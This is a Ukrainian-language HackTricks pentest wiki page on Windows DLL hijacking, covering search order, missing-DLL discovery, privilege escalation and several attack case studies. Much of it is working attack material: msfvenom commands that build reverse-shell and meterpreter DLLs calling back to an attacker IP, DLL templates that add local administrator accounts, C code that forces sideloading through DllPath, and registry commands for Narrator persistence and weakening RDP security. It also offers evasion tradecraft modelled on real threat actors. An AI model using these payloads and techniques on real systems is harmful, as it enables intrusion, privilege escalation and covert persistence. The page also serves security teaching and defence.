# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Основна інформація

DLL Hijacking полягає у маніпулюванні довіреним додатком для завантаження шкідливої DLL. Цей термін охоплює кілька тактик, таких як **DLL Spoofing, Injection, and Side-Loading**. Зазвичай використовується для code execution, досягнення persistence, і рідше — для privilege escalation. Незалежно від фокусу на escalation тут, метод захоплення залишається однаковим для різних цілей.

### Поширені техніки

Існує кілька методів для DLL hijacking, кожен з яких ефективний залежно від стратегії завантаження DLL додатком:

1. **DLL Replacement**: Обмін справжньої DLL на шкідливу, за потреби із використанням DLL Proxying для збереження функціональності оригінальної DLL.
2. **DLL Search Order Hijacking**: Розміщення шкідливої DLL у шляху пошуку, що випереджає легітимну, використовуючи шаблон пошуку додатка.
3. **Phantom DLL Hijacking**: Створення шкідливої DLL, яку додаток завантажить, вважаючи її відсутньою, але необхідною.
4. **DLL Redirection**: Зміна параметрів пошуку, таких як `%PATH%` або файли `.exe.manifest` / `.exe.local`, щоб спрямувати додаток до шкідливої DLL.
5. **WinSxS DLL Replacement**: Заміна легітимної DLL на шкідливу в директорії WinSxS — метод, часто пов'язаний із DLL side-loading.
6. **Relative Path DLL Hijacking**: Розміщення шкідливої DLL у директорії, контрольованій користувачем, разом зі скопійованим додатком, схоже на Binary Proxy Execution techniques.

> [!TIP]
> Для покрокового ланцюга, який нашаровує HTML staging, AES-CTR configs та .NET implants поверх DLL sideloading, перегляньте робочий процес нижче.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Пошук відсутніх Dlls

Найпоширеніший спосіб знайти відсутні Dlls у системі — запустити [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) із sysinternals та **встановити** **наступні 2 фільтри**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

і просто показувати **File System Activity**:

![](<../../../images/image (153).png>)

Якщо ви шукаєте **відсутні dlls загалом**, залиште це працювати кілька **секунд**.  
Якщо ви шукаєте **відсутню dll всередині конкретного виконуваного файлу**, слід встановити **додатковий фільтр, наприклад "Process Name" "contains" `<exec name>`, запустити його і зупинити захоплення подій**.

## Exploiting Missing Dlls

Щоб виконати escalate privileges, наш найкращий шанс — мати можливість **записати dll, яку процес з привілеями спробує завантажити** в одне з **місць, де її шукатимуть**. Таким чином ми можемо **записати** dll у **папку**, де **dll шукають перед** папкою, в якій знаходиться **оригінальна dll** (дивний випадок), або ми можемо **записати в папку, де dll буде шукатися**, і оригінальна **dll не існує** в жодній папці.

### Dll Search Order

**У** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **можна знайти, як саме завантажуються Dlls.**

Windows applications шукають DLLs, слідуючи набору заздалегідь визначених шляхів пошуку в певній послідовності. Проблема DLL hijacking виникає, коли шкідлива DLL стратегічно розміщена в одній із цих директорій так, що її завантажують раніше за справжню DLL. Одне з рішень — забезпечити, щоб додаток використовував абсолютні шляхи при зверненні до потрібних DLL.

Нижче наведено **порядок пошуку DLL на 32-bit** системах:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Це типовий порядок пошуку при увімкненому SafeDllSearchMode. Якщо його вимкнути, поточна директорія піднімається на друге місце. Щоб вимкнути цю опцію, створіть значення реєстру HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\\SafeDllSearchMode і встановіть його в 0 (за замовчуванням увімкнено).

Якщо функція [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) викликається з **LOAD_WITH_ALTERED_SEARCH_PATH**, пошук починається в директорії виконуваного модуля, який завантажує LoadLibraryEx.

Нарешті, зауважте, що dll може бути вказана абсолютним шляхом замість просто імені. У такому випадку ця dll буде шукатися лише за цим шляхом (якщо у dll є залежності, вони шукатимуться як зазвичай — по імені).

Існують інші способи змінити порядок пошуку, але я не збираюся пояснювати їх тут.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Розширений спосіб детерміновано вплинути на шлях пошуку DLL для щойно створеного процесу — встановити поле DllPath у RTL_USER_PROCESS_PARAMETERS під час створення процесу через нативні API ntdll. Подаючи тут директорію, контрольовану атакуючим, цільовий процес, який вирішує імпортовану DLL за назвою (без абсолютного шляху і без використання прапорів безпечного завантаження), може бути змушений завантажити шкідливу DLL з цієї директорії.

Key idea
- Build the process parameters with RtlCreateProcessParametersEx and provide a custom DllPath that points to your controlled folder (e.g., the directory where your dropper/unpacker lives).
- Create the process with RtlCreateUserProcess. When the target binary resolves a DLL by name, the loader will consult this supplied DllPath during resolution, enabling reliable sideloading even when the malicious DLL is not colocated with the target EXE.

Примітки/обмеження
- Це впливає на дочірній процес, який створюється; це відрізняється від SetDllDirectory, який впливає лише на поточний процес.
- Ціль повинна імпортувати або викликати LoadLibrary для DLL за назвою (без абсолютного шляху і без використання LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs і жорстко закодовані абсолютні шляхи не можна перехопити. Forwarded exports та SxS можуть змінювати пріоритет.

Мінімальний приклад на C (ntdll, wide strings, спрощена обробка помилок):

<details>
<summary>Повний приклад на C: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Практичний приклад використання
- Розмістіть шкідливий xmllite.dll (що експортує потрібні функції або проксирує реальний) у вашому каталозі DllPath.
- Запустіть підписаний бінарник, відомий тим, що шукає xmllite.dll за іменем, використовуючи описану вище техніку. Завантажувач вирішує імпорт через вказаний DllPath і sideloads your DLL.

Цю техніку спостерігали в реальних атаках для реалізації багатоступеневих sideloading-ланцюгів: початковий лаунчер скидає допоміжний DLL, який потім породжує Microsoft-signed, hijackable бінарник з власним DllPath, щоб примусово завантажити DLL атакуючого з проміжного каталогу.


#### Винятки щодо порядку пошуку DLL з документації Windows

Певні винятки зі стандартного порядку пошуку DLL зазначені в документації Windows:

- Коли зустрічається **DLL, що має те ж ім'я, що й уже завантажена в пам'ять**, система оминає звичайний пошук. Натомість вона перевіряє перенаправлення та маніфест перед тим, як перейти до DLL, вже завантаженої в пам'ять. **У цьому випадку система не виконує пошук DLL**.
- У випадках, коли DLL розпізнається як **known DLL** для поточної версії Windows, система використовує свою версію цієї known DLL разом із будь-якими її залежними DLL, **уникаючи процесу пошуку**. Ключ реєстру **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** містить список цих known DLL.
- Якщо **DLL має залежності**, пошук цих залежних DLL виконується так, ніби вони вказані лише своїми **іменами модулів**, незалежно від того, чи початкову DLL ідентифіковано за повним шляхом.

### Ескалація привілеїв

**Вимоги**:

- Визначте процес, який працює або буде працювати під **іншими привілеями** (horizontal or lateral movement), у якого **відсутній DLL**.
- Переконайтеся, що є доступ на **запис** для будь-якого **каталогу**, в якому **буде шукатися DLL**. Це місце може бути каталогом виконуваного файлу або каталогом у system path.

Так, ці вимоги важко знайти, оскільки за замовчуванням доволі дивно знайти привілейований виконуваний файл без DLL і ще дивніше мати права запису в папці системного шляху (за замовчуванням цього не трапляється). Але в неправильно налаштованих середовищах це можливо. Якщо вам пощастило і ви відповідаєте вимогам, перегляньте проект [UACME](https://github.com/hfiref0x/UACME). Навіть якщо **основна мета проекту — bypass UAC**, ви можете знайти там **PoC** Dll hijacking для версії Windows, який можна використати (ймовірно, просто змінивши шлях до папки, у якій у вас є права запису).

Зауважте, що ви можете **перевірити свої права у папці**, виконавши:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
І **перевірте дозволи для всіх папок у PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Ви також можете перевірити імпорти виконуваного файлу та експорти dll за допомогою:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Для повного керівництва щодо того, як **abuse Dll Hijacking to escalate privileges**, маючи дозволи на запис у **System Path folder**, дивіться:

{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Автоматизовані інструменти

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) перевірить, чи маєте ви права запису в будь-яку папку всередині system PATH.\
Інші корисні автоматизовані інструменти для виявлення цієї вразливості — це **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ та _Write-HijackDll._

### Приклад

Якщо ви знайдете експлуатовану ситуацію, одна з найважливіших речей для успішної експлуатації — це **створити dll, який експортує принаймні всі функції, які виконуваний файл буде імпортувати з нього**. Зауважте, що Dll Hijacking корисний для [escalate from Medium Integrity level to High **(обхід UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) або з [**High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system)**.** Ви можете знайти приклад **how to create a valid dll** у цьому дослідженні про dll hijacking, орієнтованому на виконання: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Крім того, у **наступному розділі** ви знайдете кілька **basic dll codes**, які можуть бути корисні як **templates** або для створення **dll with non required functions exported**.

## **Creating and compiling Dlls**

### **Dll Proxifying**

По суті, **Dll proxy** — це Dll, здатний **виконати ваш шкідливий код при завантаженні**, але також **представлятися** і **працювати**, як очікується, **перенаправляючи всі виклики до реальної бібліотеки**.

За допомогою інструменту [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) або [**Spartacus**](https://github.com/Accenture/Spartacus) ви фактично можете **вказати виконуваний файл і вибрати бібліотеку**, яку хочете proxify, та **згенерувати proxified dll**, або **вказати Dll** і **згенерувати proxified dll**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Отримати meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Створити користувача (x86 — x64-версії не бачив):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Ваш власний

Зауважте, що в кількох випадках Dll, яку ви компілюєте, має **export several functions**, які будуть завантажені victim process. Якщо ці функції не існують, **binary won't be able to load** їх і **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Приклад C++ DLL зі створенням користувача</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Альтернативна C DLL з thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Кейс: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe досі перевіряє передбачуваний, специфічний для мови локалізаційний DLL під час запуску, який може бути hijacked для виконання довільного коду та забезпечення персистенції.

Ключові факти
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Успадкований шлях (старіші збірки): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Якщо за шляхом OneCore існує записуваний DLL, контрольований атакуючим, він буде завантажений і виконається `DllMain(DLL_PROCESS_ATTACH)`. Експорти не потрібні.

Виявлення за допомогою Procmon
- Фільтр: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Запустіть Narrator і спостерігайте спробу завантажити вищезазначений шлях.

Мінімальна DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC мовчання
- A naive hijack will speak/highlight UI. Щоб залишатися тихо, при підключенні перелічте потоки Narrator, відкрийте головний потік (`OpenThread(THREAD_SUSPEND_RESUME)`) і `SuspendThread` його; продовжуйте у власному потоці. Див. PoC для повного коду.

Trigger and persistence via Accessibility configuration
- Контекст користувача (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- З наведеним вище, при запуску Narrator завантажується підсаджена DLL. На secure desktop (екрані входу) натисніть CTRL+WIN+ENTER, щоб запустити Narrator; ваша DLL виконується як SYSTEM на secure desktop.

RDP-triggered SYSTEM execution (lateral movement)
- Дозвольте класичний RDP SecurityLayer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Підключіться по RDP до хоста; на екрані входу натисніть CTRL+WIN+ENTER, щоб запустити Narrator; ваша DLL виконується як SYSTEM на secure desktop.
- Виконання припиняється, коли RDP-сесія закривається — інжектуйте/мігруйте негайно.

Bring Your Own Accessibility (BYOA)
- Ви можете клонувати вбудований Accessibility Tool (AT) запис в реєстрі (наприклад, CursorIndicator), відредагувати його, щоб вказувати на довільний бінар/DLL, імпортувати його, а потім встановити `configuration` на цю назву AT. Це проксить довільне виконання під Accessibility framework.

Примітки
- Запис у `%windir%\System32` та зміна значень HKLM вимагають прав адміністратора.
- Вся логіка payload може жити в `DLL_PROCESS_ATTACH`; експорти не потрібні.

## Case Study: CVE-2025-1729 - Підвищення привілеїв з використанням TPQMAssistant.exe

Цей кейс демонструє **Phantom DLL Hijacking** у TrackPoint Quick Menu від Lenovo (`TPQMAssistant.exe`), відстежений як **CVE-2025-1729**.

### Деталі вразливості

- **Компонент**: `TPQMAssistant.exe`, розташований у `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Заплановане завдання**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` запускається щодня о 9:30 під контекстом увійденого користувача.
- **Дозволи каталогу**: записувані для `CREATOR OWNER`, що дозволяє локальним користувачам розміщувати довільні файли.
- **DLL Search Behavior**: Перш за все намагається завантажити `hostfxr.dll` з робочого каталогу та логить "NAME NOT FOUND" якщо відсутній, що вказує на пріоритет пошуку в локальному каталозі.

### Реалізація експлойту

Атакуючий може помістити шкідливий `hostfxr.dll` stub у той самий каталог, експлуатуючи відсутність DLL для досягнення виконання коду в контексті користувача:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Хід атаки

1. Як стандартний користувач, помістіть `hostfxr.dll` в `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Чекайте, поки заплановане завдання виконається о 9:30 під контекстом поточного користувача.
3. Якщо адміністратор увійшов у систему під час виконання завдання, шкідлива DLL запускається в сесії адміністратора з medium integrity.
4. Застосуйте стандартні техніки обходу UAC для підвищення від medium integrity до привілеїв SYSTEM.

## Кейс: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Зловмисники часто поєднують MSI-based droppers з DLL side-loading, щоб виконувати payloads під довіреним, підписаним процесом.

Chain overview
- Користувач завантажує MSI. A CustomAction запускається приховано під час GUI-встановлення (наприклад, LaunchApplication або VBScript action), реконструюючи наступний етап із вбудованих ресурсів.
- The dropper записує легітимний, підписаний EXE і шкідливу DLL в той самий каталог (приклад пари: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- Коли підписаний EXE запускається, Windows DLL search order завантажує wsc.dll з робочого каталогу першим, виконуючи код зловмисника під підписаним батьківським процесом (ATT&CK T1574.001).

MSI analysis (what to look for)
- Таблиця CustomAction:
- Шукайте записи, які запускають виконувані файли або VBScript. Приклад підозрілого патерну: LaunchApplication, який виконує вбудований файл у фоновому режимі.
- В Orca (Microsoft Orca.exe) перевірте таблиці CustomAction, InstallExecuteSequence та Binary.
- Вбудовані/розділені payloads у MSI CAB:
- Administrative extract: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Шукайте кілька маленьких фрагментів, які об'єднуються та розшифровуються за допомогою VBScript CustomAction. Звичайний потік:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Практичне sideloading з wsc_proxy.exe
- Помістіть ці два файли в одну й ту саму папку:
- wsc_proxy.exe: легітимний підписаний хост (Avast). Процес намагається завантажити wsc.dll за іменем зі своєї директорії.
- wsc.dll: attacker DLL. Якщо не потрібні конкретні експорти, DllMain може бути достатнім; інакше побудуйте proxy DLL і перенаправте необхідні експорти до справжньої бібліотеки, запускаючи payload у DllMain.
- Створіть мінімальний DLL payload:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Для вимог щодо експорту використовуйте проксуючий фреймворк (наприклад, DLLirant/Spartacus) для генерації forwarding DLL, яка також виконує ваш payload.

- Ця техніка базується на розв'язуванні імен DLL хост-бінарником. Якщо хост використовує абсолютні шляхи або прапори безпечного завантаження (наприклад, LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack може не спрацювати.
- KnownDLLs, SxS, and forwarded exports можуть впливати на пріоритет і повинні бути враховані при виборі хост-бінарника та набору експорту.

## Підписані тріади + зашифровані payload'и (ShadowPad case study)

Check Point описали, як Ink Dragon розгортає ShadowPad, використовуючи **тріаду з трьох файлів**, щоб зливатися з легітимним ПЗ, водночас тримаючи основний payload зашифрованим на диску:

1. **Signed host EXE** – vendors such as AMD, Realtek, or NVIDIA are abused (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Атакувальники перейменовують виконуваний файл, щоб він виглядав як Windows-бінар (наприклад `conhost.exe`), але Authenticode-підпис залишається дійсним.
2. **Malicious loader DLL** – dropped next to the EXE with an expected name (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL зазвичай є MFC-бінаром, заобфускованим з використанням ScatterBrain framework; її єдине завдання — знайти зашифрований blob, розшифрувати його та рефлекторно відобразити ShadowPad.
3. **Encrypted payload blob** – often stored as `<name>.tmp` in the same directory. Після memory-mapping розшифрованого payload, loader видаляє TMP-файл, щоб знищити судові докази.

Tradecraft notes:

* Переіменування підписаного EXE (зберігаючи оригінальний `OriginalFileName` у PE-заголовку) дозволяє йому маскуватися під Windows-бінар, але зберігати підпис вендора, тому наслідуйте звичку Ink Dragon скидати `conhost.exe`-подібні бінарники, які насправді є утилітами AMD/NVIDIA.
* Оскільки виконуваний файл залишається довіреним, більшості allowlisting-контролів достатньо, щоб ваш шкідливий DLL знаходився поруч. Зосередьтесь на кастомізації loader DLL; підписаний parent зазвичай може запускатися без змін.
* Дешифратор ShadowPad очікує, що TMP-blob буде поруч із loader і буде записуваним, щоб він міг занулити файл після відображення. Тримайте директорію записуваною, поки payload не завантажиться; коли в пам'яті, TMP-файл можна безпечно видалити для OPSEC.

## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Серія вторгнень Lotus Blossom зловживала довіреним оновлювальним ланцюгом, щоб доставити NSIS-packed dropper, який ставив DLL sideload і повністю виконувані в пам'яті payload'и.

Послідовність дій
- `update.exe` (NSIS) створює `%AppData%\Bluetooth`, позначає її **HIDDEN**, скидає перейменований Bitdefender Submission Wizard `BluetoothService.exe`, шкідливий `log.dll` і зашифрований blob `BluetoothService`, а потім запускає EXE.
- Хостовий EXE імпортує `log.dll` і викликає `LogInit`/`LogWrite`. `LogInit` mmap-завантажує blob; `LogWrite` розшифровує його кастомним потоком на основі LCG (константи **0x19660D** / **0x3C6EF35F**, ключовий матеріал похідний від попереднього хешу), перезаписує буфер чистим shellcode, звільняє тимчасові буфери і переходить до нього.
- Щоб уникнути IAT, loader розв'язує API шляхом хешування імен експорту з використанням **FNV-1a basis 0x811C9DC5 + prime 0x1000193**, потім застосовує Murmur-подібний avalanche (**0x85EBCA6B**) і порівнює з посоленими цільовими хешами.

Main shellcode (Chrysalis)
- Розшифровує PE-подібний головний модуль шляхом повторення add/XOR/sub з ключем `gQ2JR&9;` протягом п'яти проходів, потім динамічно завантажує `Kernel32.dll` → `GetProcAddress` для завершення резолюції імпортів.
- Відновлює рядки імен DLL під час виконання через побайтові bit-rotate/XOR трансформації, після чого завантажує `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Використовує другий резольвер, який проходить по **PEB → InMemoryOrderModuleList**, парсить кожну таблицю експорту по 4-байтних блоках з Murmur-подібним змішуванням і повертається до `GetProcAddress` лише якщо хеш не знайдено.

Вбудована конфігурація та C2
- Конфіг знаходиться всередині скинутого файлу `BluetoothService` на **offset 0x30808** (розмір **0x980**) і RC4-розшифровується ключем `qwhvb^435h&*7`, що відкриває C2 URL та User-Agent.
- Beacons будують крапково-розділений профіль хоста, додають префікс tag `4Q`, потім RC4-шифрують ключем `vAuig34%^325hGV` перед `HttpSendRequestA` по HTTPS. Відповіді RC4-розшифровуються і розподіляються за допомогою tag switch (`4T` shell, `4V` process exec, `4W/4X` запис файлу, `4Y` читання/exfil, `4\\` деінсталяція, `4` перерахування дисків/файлів + випадки chunked transfer).
- Режим виконання контролюється CLI-аргументами: без аргументів = встановлення persistence (service/Run key) з вказівкою на `-i`; `-i` перезапускає себе з `-k`; `-k` пропускає інсталяцію і запускає payload.

Спостережений альтернативний loader
- Те саме вторгнення скинуло Tiny C Compiler і виконало `svchost.exe -nostdlib -run conf.c` з `C:\ProgramData\USOShared\`, з `libtcc.dll` поруч. Наданий атакуючими C-джерельний код вбудовував shellcode, компілювався і виконувався в пам'яті без запису PE на диск. Відтворити за допомогою:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Цей TCC-based етап компіляції та виконання імпортував `Wininet.dll` під час виконання та завантажував second-stage shellcode з жорстко вбудованої URL-адреси, забезпечуючи гнучкий loader, який маскується під запуск компілятора.

## Посилання

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)


{{#include ../../../banners/hacktricks-training.md}}
